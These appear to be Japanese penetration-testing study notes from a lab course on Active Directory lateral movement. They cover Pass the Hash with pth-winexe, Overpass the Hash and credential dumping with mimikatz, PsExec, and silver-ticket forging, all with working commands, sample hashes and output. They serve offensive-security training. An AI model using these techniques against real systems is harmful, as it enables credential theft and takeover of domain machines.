### Pass the Hash

* Kerberos 認証では動作せず、NTLM 認証を用いたサーバやサービスでのみ動作する

* ファイアウォールを介したSMB接続（通常はポート445）と、Windowsのファイルおよびプリント共有機能が有効であることが必要

* (Metasploit, 2017), https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/ [↩︎](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-lateral-movement/pass-the-hash#fnref1)

  (@byt3bl33d3r, 2015), https://github.com/byt3bl33d3r/pth-toolkit [↩︎](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/active-directory-attacks/active-directory-lateral-movement/pass-the-hash#fnref2)

  (Core Security, 2017), https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py 

* #### pth-winexe(kaliから横展開)

  ```bash
  └─$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.151.1   
  E_md4hash wrapper called.
  HASH PASS: Substituting user supplied NTLM HASH...
  Microsoft Windows [Version 10.0.16299.15]
  (c) 2017 Microsoft Corporation. All rights reserved.
  
  C:\Windows\system32>whoami
  whoami
  client251\administrator
  ```

  https://yougottahackthat.com/blog/339/what-is-aad3b435b51404eeaad3b435b51404ee

  ※Active Directoryのドメインアカウントと組み込みのローカル管理者アカウントに有効です。2014年のセキュリティアップデート7以降、この手法は他のローカル管理者アカウントとして認証するために使用することはできない





### Overthehash

NTLM ハッシュを Kerberos チケットに変換し、NTLM 認証を使用しないようにしてTGTやTGSを取得する

* キャッシュにクレデンシャルを残す

  * mimikatzを起動しておく

  * notepadを起動しキャッシュを残したいユーザで実行する

    * notepadをoffsecで普通に開く

    * 上の画像のようにピンバーを右クリックし、Notepadをshift+右クリックで選択し「Run as a different User」を選択し

      ```
      corp\jeff_admin
      lab
      ```

      でnotepadを開く

    * mimikatzでクレデンシャルをダンプする

      ```
      sekurlsa::logonpasswords
      ```

* mimikatzでover the hashする

  powershellを起動する

  ```
  sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
  ```

* Kerberosチケットを確認する（この時点ではなし）

  ```powershell
  PS C:\Windows\system32> klist
  Current LogonId is 0:0x186536
  Cached Tickets: (0)
  ```

* ドメインコントローラ上のネットワーク共有に接続してTGTを生成する

  （TGTを生成するコマンドであれば任意だが、ここではネットワーク共有への接続を紹介していた）

  ```
  net use \\dc01
  klist
  ```

  TGTとTGSが登録される

* PsExecで横展開する

  ※PsExecはリモートでコマンドを実行できるが、パスワードハッシュを受け入れない

  ```powershell
  .\PsExec.exe \\dc01 cmd.exe
  ipconfig
  whoami
  ```


※Over the HashもAdmin$という特別な管理者共有へのアクセスが必要なため、ターゲットマシンのローカル管理者権限が必要となる



### Pass the Ticket

TGT は作成されたマシンでしか使用できないが、TGS はネットワーク上の他の場所にエクスポートして再投入し、特定のサービスへの認証に使用することができる

サービスアカウントのパスワードを利用してサービスチケットを偽造する→シルバーチケット

サービスプリンシパル名が複数のサーバで使用されている場合、シルバーチケットはそれら全てに対して活用することが可能

#### SID構造

```
S-R-I-S
```

R：リビジョンレベル（通常 "1 "に設定）

I：識別子-権限値（AD内では "5 "が多い）

S：サブ権限値

```
S-1-5-21-2536614405-3629634762-1218571035-1116
```

サブ権限の値は

* ドメインの数値識別子：21-2536614405-3629634762-1218571035
* ドメイン内の特定のオブジェクトを表す相対識別子：1116

に分かれる

#### SIDの取得

```cmd
whoami /user

---
C:\Windows\system32>whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103
```

#### サービスアカウントのパスワードハッシュの取得

シルバーチケットに必要となる。kerberousでiis_serverのパスワードは取得済の前提

```cmd
kerberos::hash /user:iis_service /domain:corp.com /password:Qwerty09!

----
mimikatz # kerberos::hash /user:iis_service /domain:corp.com /password:Qwerty09!
        * rc4_hmac_nt       e2b475c11da2a0748290d87aa966c327
        * aes128_hmac       7eabd29e56e7e8a31b1c180b88e7b801
        * aes256_hmac 
```

#### シルバーチケットの取得

```cmd
# チケットを一度削除
kerberos::purge
kerberos::list

kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:e2b475c11da2a0748290d87aa966c327 /ptt
```

* `kerberos::golden`：名前がゴールドだがシルバー
* /sid：ユーザのSID
* /target：サービスの完全修飾ホスト名
* /service：サービスタイプ
* /rc4：is_serviceサービスアカウントのパスワードハッシュ



